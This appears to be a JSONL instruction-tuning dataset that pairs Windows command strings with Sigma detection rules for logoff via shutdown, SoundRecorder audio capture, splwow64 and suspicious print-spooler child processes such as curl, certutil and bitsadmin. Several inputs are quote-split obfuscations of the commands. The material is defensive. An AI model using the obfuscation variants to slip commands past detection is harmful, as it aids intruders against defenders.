{"instruction": "Write Sigma rule to detect payload:", "input": "\\\"s\"\"h\"\"u\"\"t\"\"d\"\"o\"\"w\"\"n\"\".\"\"e\"\"x\"\"e\" /l", "output": "title: Suspicious Execution of Shutdown to Log Out\nid: ec290c06-9b6b-4338-8b6b-095c0f284f10\nstatus: test\ndescription: Detects the rare use of the command line tool shutdown to logoff a user\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/9e5b12c4912c07562aec7500447b11fa3e17e254/atomics/T1529/T1529.md\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/shutdown\nauthor: frack113\ndate: 2022-10-01\ntags:\n    - attack.impact\n    - attack.t1529\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\shutdown.exe'\n        CommandLine|contains: '/l'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\shutdown /l", "output": "title: Suspicious Execution of Shutdown to Log Out\nid: ec290c06-9b6b-4338-8b6b-095c0f284f10\nstatus: test\ndescription: Detects the rare use of the command line tool shutdown to logoff a user\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/9e5b12c4912c07562aec7500447b11fa3e17e254/atomics/T1529/T1529.md\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/shutdown\nauthor: frack113\ndate: 2022-10-01\ntags:\n    - attack.impact\n    - attack.t1529\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\shutdown.exe'\n        CommandLine|contains: '/l'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\shutdown.exe /l", "output": "title: Suspicious Execution of Shutdown to Log Out\nid: ec290c06-9b6b-4338-8b6b-095c0f284f10\nstatus: test\ndescription: Detects the rare use of the command line tool shutdown to logoff a user\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/9e5b12c4912c07562aec7500447b11fa3e17e254/atomics/T1529/T1529.md\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/shutdown\nauthor: frack113\ndate: 2022-10-01\ntags:\n    - attack.impact\n    - attack.t1529\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\shutdown.exe'\n        CommandLine|contains: '/l'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SndVol.exe \\rundll32.exe shell32.dll,Control_RunDLL", "output": "title: Uncommon Child Processes Of SndVol.exe\nid: ba42babc-0666-4393-a4f7-ceaf5a69191e\nstatus: test\ndescription: Detects potentially uncommon child processes of SndVol.exe (the Windows volume mixer)\nreferences:\n    - https://twitter.com/Max_Mal_/status/1661322732456353792\nauthor: X__Junior (Nextron Systems)\ndate: 2023-06-09\ntags:\n    - attack.execution\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        ParentImage|endswith: '\\SndVol.exe'\n    filter_main_rundll32:\n        Image|endswith: '\\rundll32.exe'\n        CommandLine|contains: ' shell32.dll,Control_RunDLL '\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SndVol.exe \\rundll32.exe \\\"s\\\"\\\"h\\\"\\\"e\\\"\\\"l\\\"\\\"l\\\"\\\"3\\\"\\\"2\\\"\\\".\\\"\\\"d\\\"\\\"l\\\"\\\"l\\\"\\\",\\\"\\\"C\\\"\\\"o\\\"\\\"n\\\"\\\"t\\\"\\\"r\\\"\\\"o\\\"\\\"l\\\"\\\"_\\\"\\\"R\\\"\\\"u\\\"\\\"n\\\"\\\"D\\\"\\\"L\\\"\\\"L\\\"", "output": "title: Uncommon Child Processes Of SndVol.exe\nid: ba42babc-0666-4393-a4f7-ceaf5a69191e\nstatus: test\ndescription: Detects potentially uncommon child processes of SndVol.exe (the Windows volume mixer)\nreferences:\n    - https://twitter.com/Max_Mal_/status/1661322732456353792\nauthor: X__Junior (Nextron Systems)\ndate: 2023-06-09\ntags:\n    - attack.execution\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        ParentImage|endswith: '\\SndVol.exe'\n    filter_main_rundll32:\n        Image|endswith: '\\rundll32.exe'\n        CommandLine|contains: ' shell32.dll,Control_RunDLL '\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SndVol.exe \\rundll32.exe run-control", "output": "title: Uncommon Child Processes Of SndVol.exe\nid: ba42babc-0666-4393-a4f7-ceaf5a69191e\nstatus: test\ndescription: Detects potentially uncommon child processes of SndVol.exe (the Windows volume mixer)\nreferences:\n    - https://twitter.com/Max_Mal_/status/1661322732456353792\nauthor: X__Junior (Nextron Systems)\ndate: 2023-06-09\ntags:\n    - attack.execution\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        ParentImage|endswith: '\\SndVol.exe'\n    filter_main_rundll32:\n        Image|endswith: '\\rundll32.exe'\n        CommandLine|contains: ' shell32.dll,Control_RunDLL '\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SndVol \\rundll32 shell32.dll,Control_RunDLL", "output": "title: Uncommon Child Processes Of SndVol.exe\nid: ba42babc-0666-4393-a4f7-ceaf5a69191e\nstatus: test\ndescription: Detects potentially uncommon child processes of SndVol.exe (the Windows volume mixer)\nreferences:\n    - https://twitter.com/Max_Mal_/status/1661322732456353792\nauthor: X__Junior (Nextron Systems)\ndate: 2023-06-09\ntags:\n    - attack.execution\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        ParentImage|endswith: '\\SndVol.exe'\n    filter_main_rundll32:\n        Image|endswith: '\\rundll32.exe'\n        CommandLine|contains: ' shell32.dll,Control_RunDLL '\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SndVol.exe shell32.dll,Control_RunDLL \\rundll32.exe", "output": "title: Uncommon Child Processes Of SndVol.exe\nid: ba42babc-0666-4393-a4f7-ceaf5a69191e\nstatus: test\ndescription: Detects potentially uncommon child processes of SndVol.exe (the Windows volume mixer)\nreferences:\n    - https://twitter.com/Max_Mal_/status/1661322732456353792\nauthor: X__Junior (Nextron Systems)\ndate: 2023-06-09\ntags:\n    - attack.execution\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        ParentImage|endswith: '\\SndVol.exe'\n    filter_main_rundll32:\n        Image|endswith: '\\rundll32.exe'\n        CommandLine|contains: ' shell32.dll,Control_RunDLL '\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SoundRecorder.exe /FILE", "output": "title: Audio Capture via SoundRecorder\nid: 83865853-59aa-449e-9600-74b9d89a6d6e\nstatus: test\ndescription: Detect attacker collecting audio via SoundRecorder application.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1123/T1123.md\n    - https://eqllib.readthedocs.io/en/latest/analytics/f72a98cb-7b3d-4100-99c3-a138b6e9ff6e.html\nauthor: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community\ndate: 2019-10-24\nmodified: 2021-11-27\ntags:\n    - attack.collection\n    - attack.t1123\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\SoundRecorder.exe'\n        CommandLine|contains: '/FILE'\n    condition: selection\nfalsepositives:\n    - Legitimate audio capture by legitimate user.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SoundRecorder /FILE", "output": "title: Audio Capture via SoundRecorder\nid: 83865853-59aa-449e-9600-74b9d89a6d6e\nstatus: test\ndescription: Detect attacker collecting audio via SoundRecorder application.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1123/T1123.md\n    - https://eqllib.readthedocs.io/en/latest/analytics/f72a98cb-7b3d-4100-99c3-a138b6e9ff6e.html\nauthor: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community\ndate: 2019-10-24\nmodified: 2021-11-27\ntags:\n    - attack.collection\n    - attack.t1123\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\SoundRecorder.exe'\n        CommandLine|contains: '/FILE'\n    condition: selection\nfalsepositives:\n    - Legitimate audio capture by legitimate user.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SoundRecorder.exe /FILE", "output": "title: Audio Capture via SoundRecorder\nid: 83865853-59aa-449e-9600-74b9d89a6d6e\nstatus: test\ndescription: Detect attacker collecting audio via SoundRecorder application.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1123/T1123.md\n    - https://eqllib.readthedocs.io/en/latest/analytics/f72a98cb-7b3d-4100-99c3-a138b6e9ff6e.html\nauthor: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community\ndate: 2019-10-24\nmodified: 2021-11-27\ntags:\n    - attack.collection\n    - attack.t1123\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\SoundRecorder.exe'\n        CommandLine|contains: '/FILE'\n    condition: selection\nfalsepositives:\n    - Legitimate audio capture by legitimate user.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\splwow64.exe", "output": "title: Suspicious Splwow64 Without Params\nid: 1f1a8509-2cbb-44f5-8751-8e1571518ce2\nstatus: test\ndescription: Detects suspicious Splwow64.exe process without any command line parameters\nreferences:\n    - https://twitter.com/sbousseaden/status/1429401053229891590?s=12\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-08-23\nmodified: 2022-12-25\ntags:\n    - attack.defense-evasion\n    - attack.t1202\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\splwow64.exe'\n        CommandLine|endswith: 'splwow64.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\\"s\"\"p\"\"l\"\"w\"\"o\"\"w\"\"6\"\"4\"\".\"\"e\"\"x\"\"e\"", "output": "title: Suspicious Splwow64 Without Params\nid: 1f1a8509-2cbb-44f5-8751-8e1571518ce2\nstatus: test\ndescription: Detects suspicious Splwow64.exe process without any command line parameters\nreferences:\n    - https://twitter.com/sbousseaden/status/1429401053229891590?s=12\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-08-23\nmodified: 2022-12-25\ntags:\n    - attack.defense-evasion\n    - attack.t1202\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\splwow64.exe'\n        CommandLine|endswith: 'splwow64.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\splwow64", "output": "title: Suspicious Splwow64 Without Params\nid: 1f1a8509-2cbb-44f5-8751-8e1571518ce2\nstatus: test\ndescription: Detects suspicious Splwow64.exe process without any command line parameters\nreferences:\n    - https://twitter.com/sbousseaden/status/1429401053229891590?s=12\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-08-23\nmodified: 2022-12-25\ntags:\n    - attack.defense-evasion\n    - attack.t1202\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\splwow64.exe'\n        CommandLine|endswith: 'splwow64.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\splwow64.exe", "output": "title: Suspicious Splwow64 Without Params\nid: 1f1a8509-2cbb-44f5-8751-8e1571518ce2\nstatus: test\ndescription: Detects suspicious Splwow64.exe process without any command line parameters\nreferences:\n    - https://twitter.com/sbousseaden/status/1429401053229891590?s=12\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-08-23\nmodified: 2022-12-25\ntags:\n    - attack.defense-evasion\n    - attack.t1202\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\splwow64.exe'\n        CommandLine|endswith: 'splwow64.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\spoolsv.exe \\gpupdate.exe \\whoami.exe \\nltest.exe \\taskkill.exe \\wmic.exe \\taskmgr.exe \\sc.exe \\findstr.exe \\curl.exe \\wget.exe \\certutil.exe \\bitsadmin.exe \\accesschk.exe \\wevtutil.exe \\bcdedit.exe \\fsutil.exe \\cipher.exe \\schtasks.exe \\write.exe \\wuauclt.exe \\systeminfo.exe \\reg.exe \\query.exe \\net.exe \\net1.exe start \\cmd.exe .spl route add program files \\netsh.exe add portopening rule name \\powershell.exe \\pwsh.exe .spl \\rundll32.exe RUNDLL32.EXE", "output": "title: Suspicious Spool Service Child Process\nid: dcdbc940-0bff-46b2-95f3-2d73f848e33b\nstatus: test\ndescription: Detects suspicious print spool service (spoolsv.exe) child processes.\nreferences:\n    - https://github.com/microsoft/Microsoft-365-Defender-Hunting-Queries/blob/efa17a600b43c897b4b7463cc8541daa1987eeb4/Exploits/Print%20Spooler%20RCE/Suspicious%20Spoolsv%20Child%20Process.md\nauthor: Justin C. (@endisphotic), @dreadphones (detection), Thomas Patzke (Sigma rule)\ndate: 2021-07-11\nmodified: 2024-12-01\ntags:\n    - attack.execution\n    - attack.t1203\n    - attack.privilege-escalation\n    - attack.t1068\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    spoolsv:\n        ParentImage|endswith: '\\spoolsv.exe'\n        IntegrityLevel:\n            - 'System'\n            - 'S-1-16-16384'\n    suspicious_unrestricted:\n        Image|endswith:\n            - '\\gpupdate.exe'\n            - '\\whoami.exe'\n            - '\\nltest.exe'\n            - '\\taskkill.exe'\n            - '\\wmic.exe'\n            - '\\taskmgr.exe'\n            - '\\sc.exe'\n            - '\\findstr.exe'\n            - '\\curl.exe'\n            - '\\wget.exe'\n            - '\\certutil.exe'\n            - '\\bitsadmin.exe'\n            - '\\accesschk.exe'\n            - '\\wevtutil.exe'\n            - '\\bcdedit.exe'\n            - '\\fsutil.exe'\n            - '\\cipher.exe'\n            - '\\schtasks.exe'\n            - '\\write.exe'\n            - '\\wuauclt.exe'\n            - '\\systeminfo.exe'\n            - '\\reg.exe'\n            - '\\query.exe'\n    suspicious_net:\n        Image|endswith:\n            - '\\net.exe'\n            - '\\net1.exe'\n    suspicious_net_filter:\n        CommandLine|contains: 'start'\n    suspicious_cmd:\n        Image|endswith: '\\cmd.exe'\n    suspicious_cmd_filter:\n        CommandLine|contains:\n            - '.spl'\n            - 'route add'\n            - 'program files'\n    suspicious_netsh:\n        Image|endswith: '\\netsh.exe'\n    suspicious_netsh_filter:\n        CommandLine|contains:\n            - 'add portopening'\n            - 'rule name'\n    suspicious_powershell:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n    suspicious_powershell_filter:\n        CommandLine|contains: '.spl'\n    suspicious_rundll32_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    suspicious_rundll32_cli:\n        CommandLine|endswith: 'rundll32.exe'\n    condition: spoolsv and ( suspicious_unrestricted or (suspicious_net and not suspicious_net_filter) or (suspicious_cmd and not suspicious_cmd_filter) or (suspicious_netsh and not suspicious_netsh_filter) or (suspicious_powershell and not suspicious_powershell_filter) or all of suspicious_rundll32_* )\nfields:\n    - Image\n    - CommandLine\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\spoolsv.exe \\gpupdate.exe \\whoami.exe \\nltest.exe \\taskkill.exe \\wmic.exe \\taskmgr.exe \\sc.exe \\findstr.exe \\curl.exe \\wget.exe \\certutil.exe \\bitsadmin.exe \\accesschk.exe \\wevtutil.exe \\bcdedit.exe \\fsutil.exe \\cipher.exe \\schtasks.exe \\write.exe \\wuauclt.exe \\systeminfo.exe \\reg.exe \\\"\\\\\"\\\"q\\\"\\\"u\\\"\\\"e\\\"\\\"r\\\"\\\"y\\\"\\\".\\\"\\\"e\\\"\\\"x\\\"\\\"e\\\" \\net.exe \\net1.exe start \\cmd.exe .spl route add program files \\netsh.exe add portopening rule name \\powershell.exe \\pwsh.exe .spl \\rundll32.exe RUNDLL32.EXE", "output": "title: Suspicious Spool Service Child Process\nid: dcdbc940-0bff-46b2-95f3-2d73f848e33b\nstatus: test\ndescription: Detects suspicious print spool service (spoolsv.exe) child processes.\nreferences:\n    - https://github.com/microsoft/Microsoft-365-Defender-Hunting-Queries/blob/efa17a600b43c897b4b7463cc8541daa1987eeb4/Exploits/Print%20Spooler%20RCE/Suspicious%20Spoolsv%20Child%20Process.md\nauthor: Justin C. (@endisphotic), @dreadphones (detection), Thomas Patzke (Sigma rule)\ndate: 2021-07-11\nmodified: 2024-12-01\ntags:\n    - attack.execution\n    - attack.t1203\n    - attack.privilege-escalation\n    - attack.t1068\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    spoolsv:\n        ParentImage|endswith: '\\spoolsv.exe'\n        IntegrityLevel:\n            - 'System'\n            - 'S-1-16-16384'\n    suspicious_unrestricted:\n        Image|endswith:\n            - '\\gpupdate.exe'\n            - '\\whoami.exe'\n            - '\\nltest.exe'\n            - '\\taskkill.exe'\n            - '\\wmic.exe'\n            - '\\taskmgr.exe'\n            - '\\sc.exe'\n            - '\\findstr.exe'\n            - '\\curl.exe'\n            - '\\wget.exe'\n            - '\\certutil.exe'\n            - '\\bitsadmin.exe'\n            - '\\accesschk.exe'\n            - '\\wevtutil.exe'\n            - '\\bcdedit.exe'\n            - '\\fsutil.exe'\n            - '\\cipher.exe'\n            - '\\schtasks.exe'\n            - '\\write.exe'\n            - '\\wuauclt.exe'\n            - '\\systeminfo.exe'\n            - '\\reg.exe'\n            - '\\query.exe'\n    suspicious_net:\n        Image|endswith:\n            - '\\net.exe'\n            - '\\net1.exe'\n    suspicious_net_filter:\n        CommandLine|contains: 'start'\n    suspicious_cmd:\n        Image|endswith: '\\cmd.exe'\n    suspicious_cmd_filter:\n        CommandLine|contains:\n            - '.spl'\n            - 'route add'\n            - 'program files'\n    suspicious_netsh:\n        Image|endswith: '\\netsh.exe'\n    suspicious_netsh_filter:\n        CommandLine|contains:\n            - 'add portopening'\n            - 'rule name'\n    suspicious_powershell:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n    suspicious_powershell_filter:\n        CommandLine|contains: '.spl'\n    suspicious_rundll32_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    suspicious_rundll32_cli:\n        CommandLine|endswith: 'rundll32.exe'\n    condition: spoolsv and ( suspicious_unrestricted or (suspicious_net and not suspicious_net_filter) or (suspicious_cmd and not suspicious_cmd_filter) or (suspicious_netsh and not suspicious_netsh_filter) or (suspicious_powershell and not suspicious_powershell_filter) or all of suspicious_rundll32_* )\nfields:\n    - Image\n    - CommandLine\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\spoolsv.exe \\gpupdate.exe \\whoami.exe \\nltest.exe \\taskkill.exe \\wmic.exe \\taskmgr.exe \\sc.exe \\findstr.exe \\curl.exe \\w--get.exe \\certutil.exe \\bitsadmin.exe \\accesschk.exe \\wevtutil.exe \\bcdedit.exe \\fsutil.exe \\cipher.exe \\schtasks.exe \\write.exe \\wuauclt.exe \\systeminfo.exe \\reg.exe \\query.exe \\net.exe \\net1.exe start \\cmd.exe .spl route add program files \\netsh.exe add portopening rule name \\powershell.exe \\pwsh.exe .spl \\rundll32.exe RUNDLL32.EXE", "output": "title: Suspicious Spool Service Child Process\nid: dcdbc940-0bff-46b2-95f3-2d73f848e33b\nstatus: test\ndescription: Detects suspicious print spool service (spoolsv.exe) child processes.\nreferences:\n    - https://github.com/microsoft/Microsoft-365-Defender-Hunting-Queries/blob/efa17a600b43c897b4b7463cc8541daa1987eeb4/Exploits/Print%20Spooler%20RCE/Suspicious%20Spoolsv%20Child%20Process.md\nauthor: Justin C. (@endisphotic), @dreadphones (detection), Thomas Patzke (Sigma rule)\ndate: 2021-07-11\nmodified: 2024-12-01\ntags:\n    - attack.execution\n    - attack.t1203\n    - attack.privilege-escalation\n    - attack.t1068\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    spoolsv:\n        ParentImage|endswith: '\\spoolsv.exe'\n        IntegrityLevel:\n            - 'System'\n            - 'S-1-16-16384'\n    suspicious_unrestricted:\n        Image|endswith:\n            - '\\gpupdate.exe'\n            - '\\whoami.exe'\n            - '\\nltest.exe'\n            - '\\taskkill.exe'\n            - '\\wmic.exe'\n            - '\\taskmgr.exe'\n            - '\\sc.exe'\n            - '\\findstr.exe'\n            - '\\curl.exe'\n            - '\\wget.exe'\n            - '\\certutil.exe'\n            - '\\bitsadmin.exe'\n            - '\\accesschk.exe'\n            - '\\wevtutil.exe'\n            - '\\bcdedit.exe'\n            - '\\fsutil.exe'\n            - '\\cipher.exe'\n            - '\\schtasks.exe'\n            - '\\write.exe'\n            - '\\wuauclt.exe'\n            - '\\systeminfo.exe'\n            - '\\reg.exe'\n            - '\\query.exe'\n    suspicious_net:\n        Image|endswith:\n            - '\\net.exe'\n            - '\\net1.exe'\n    suspicious_net_filter:\n        CommandLine|contains: 'start'\n    suspicious_cmd:\n        Image|endswith: '\\cmd.exe'\n    suspicious_cmd_filter:\n        CommandLine|contains:\n            - '.spl'\n            - 'route add'\n            - 'program files'\n    suspicious_netsh:\n        Image|endswith: '\\netsh.exe'\n    suspicious_netsh_filter:\n        CommandLine|contains:\n            - 'add portopening'\n            - 'rule name'\n    suspicious_powershell:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n    suspicious_powershell_filter:\n        CommandLine|contains: '.spl'\n    suspicious_rundll32_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    suspicious_rundll32_cli:\n        CommandLine|endswith: 'rundll32.exe'\n    condition: spoolsv and ( suspicious_unrestricted or (suspicious_net and not suspicious_net_filter) or (suspicious_cmd and not suspicious_cmd_filter) or (suspicious_netsh and not suspicious_netsh_filter) or (suspicious_powershell and not suspicious_powershell_filter) or all of suspicious_rundll32_* )\nfields:\n    - Image\n    - CommandLine\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\spoolsv \\gpupdate \\whoami \\nltest \\taskkill \\wmic \\taskmgr \\sc \\findstr \\curl \\wget \\certutil \\bitsadmin \\accesschk \\wevtutil \\bcdedit \\fsutil \\cipher \\schtasks \\write \\wuauclt \\systeminfo \\reg \\query \\net \\net1 start \\cmd .spl route add program files \\netsh add portopening rule name \\powershell \\pwsh .spl \\rundll32 RUNDLL32", "output": "title: Suspicious Spool Service Child Process\nid: dcdbc940-0bff-46b2-95f3-2d73f848e33b\nstatus: test\ndescription: Detects suspicious print spool service (spoolsv.exe) child processes.\nreferences:\n    - https://github.com/microsoft/Microsoft-365-Defender-Hunting-Queries/blob/efa17a600b43c897b4b7463cc8541daa1987eeb4/Exploits/Print%20Spooler%20RCE/Suspicious%20Spoolsv%20Child%20Process.md\nauthor: Justin C. (@endisphotic), @dreadphones (detection), Thomas Patzke (Sigma rule)\ndate: 2021-07-11\nmodified: 2024-12-01\ntags:\n    - attack.execution\n    - attack.t1203\n    - attack.privilege-escalation\n    - attack.t1068\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    spoolsv:\n        ParentImage|endswith: '\\spoolsv.exe'\n        IntegrityLevel:\n            - 'System'\n            - 'S-1-16-16384'\n    suspicious_unrestricted:\n        Image|endswith:\n            - '\\gpupdate.exe'\n            - '\\whoami.exe'\n            - '\\nltest.exe'\n            - '\\taskkill.exe'\n            - '\\wmic.exe'\n            - '\\taskmgr.exe'\n            - '\\sc.exe'\n            - '\\findstr.exe'\n            - '\\curl.exe'\n            - '\\wget.exe'\n            - '\\certutil.exe'\n            - '\\bitsadmin.exe'\n            - '\\accesschk.exe'\n            - '\\wevtutil.exe'\n            - '\\bcdedit.exe'\n            - '\\fsutil.exe'\n            - '\\cipher.exe'\n            - '\\schtasks.exe'\n            - '\\write.exe'\n            - '\\wuauclt.exe'\n            - '\\systeminfo.exe'\n            - '\\reg.exe'\n            - '\\query.exe'\n    suspicious_net:\n        Image|endswith:\n            - '\\net.exe'\n            - '\\net1.exe'\n    suspicious_net_filter:\n        CommandLine|contains: 'start'\n    suspicious_cmd:\n        Image|endswith: '\\cmd.exe'\n    suspicious_cmd_filter:\n        CommandLine|contains:\n            - '.spl'\n            - 'route add'\n            - 'program files'\n    suspicious_netsh:\n        Image|endswith: '\\netsh.exe'\n    suspicious_netsh_filter:\n        CommandLine|contains:\n            - 'add portopening'\n            - 'rule name'\n    suspicious_powershell:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n    suspicious_powershell_filter:\n        CommandLine|contains: '.spl'\n    suspicious_rundll32_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    suspicious_rundll32_cli:\n        CommandLine|endswith: 'rundll32.exe'\n    condition: spoolsv and ( suspicious_unrestricted or (suspicious_net and not suspicious_net_filter) or (suspicious_cmd and not suspicious_cmd_filter) or (suspicious_netsh and not suspicious_netsh_filter) or (suspicious_powershell and not suspicious_powershell_filter) or all of suspicious_rundll32_* )\nfields:\n    - Image\n    - CommandLine\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\spoolsv.exe \\gpupdate.exe \\whoami.exe \\nltest.exe \\taskkill.exe \\wmic.exe \\taskmgr.exe \\sc.exe \\findstr.exe \\curl.exe \\wget.exe \\certutil.exe \\bitsadmin.exe \\accesschk.exe \\wevtutil.exe \\bcdedit.exe \\fsutil.exe \\cipher.exe \\schtasks.exe \\write.exe \\wuauclt.exe \\systeminfo.exe \\reg.exe \\query.exe \\net.exe \\net1.exe start \\cmd.exe .spl route add program files \\netsh.exe add portopening rule name \\powershell.exe \\pwsh.exe .spl \\rundll32.exe RUNDLL32.EXE", "output": "title: Suspicious Spool Service Child Process\nid: dcdbc940-0bff-46b2-95f3-2d73f848e33b\nstatus: test\ndescription: Detects suspicious print spool service (spoolsv.exe) child processes.\nreferences:\n    - https://github.com/microsoft/Microsoft-365-Defender-Hunting-Queries/blob/efa17a600b43c897b4b7463cc8541daa1987eeb4/Exploits/Print%20Spooler%20RCE/Suspicious%20Spoolsv%20Child%20Process.md\nauthor: Justin C. (@endisphotic), @dreadphones (detection), Thomas Patzke (Sigma rule)\ndate: 2021-07-11\nmodified: 2024-12-01\ntags:\n    - attack.execution\n    - attack.t1203\n    - attack.privilege-escalation\n    - attack.t1068\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    spoolsv:\n        ParentImage|endswith: '\\spoolsv.exe'\n        IntegrityLevel:\n            - 'System'\n            - 'S-1-16-16384'\n    suspicious_unrestricted:\n        Image|endswith:\n            - '\\gpupdate.exe'\n            - '\\whoami.exe'\n            - '\\nltest.exe'\n            - '\\taskkill.exe'\n            - '\\wmic.exe'\n            - '\\taskmgr.exe'\n            - '\\sc.exe'\n            - '\\findstr.exe'\n            - '\\curl.exe'\n            - '\\wget.exe'\n            - '\\certutil.exe'\n            - '\\bitsadmin.exe'\n            - '\\accesschk.exe'\n            - '\\wevtutil.exe'\n            - '\\bcdedit.exe'\n            - '\\fsutil.exe'\n            - '\\cipher.exe'\n            - '\\schtasks.exe'\n            - '\\write.exe'\n            - '\\wuauclt.exe'\n            - '\\systeminfo.exe'\n            - '\\reg.exe'\n            - '\\query.exe'\n    suspicious_net:\n        Image|endswith:\n            - '\\net.exe'\n            - '\\net1.exe'\n    suspicious_net_filter:\n        CommandLine|contains: 'start'\n    suspicious_cmd:\n        Image|endswith: '\\cmd.exe'\n    suspicious_cmd_filter:\n        CommandLine|contains:\n            - '.spl'\n            - 'route add'\n            - 'program files'\n    suspicious_netsh:\n        Image|endswith: '\\netsh.exe'\n    suspicious_netsh_filter:\n        CommandLine|contains:\n            - 'add portopening'\n            - 'rule name'\n    suspicious_powershell:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n    suspicious_powershell_filter:\n        CommandLine|contains: '.spl'\n    suspicious_rundll32_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    suspicious_rundll32_cli:\n        CommandLine|endswith: 'rundll32.exe'\n    condition: spoolsv and ( suspicious_unrestricted or (suspicious_net and not suspicious_net_filter) or (suspicious_cmd and not suspicious_cmd_filter) or (suspicious_netsh and not suspicious_netsh_filter) or (suspicious_powershell and not suspicious_powershell_filter) or all of suspicious_rundll32_* )\nfields:\n    - Image\n    - CommandLine\nfalsepositives:\n    - Unknown\nlevel: high"}
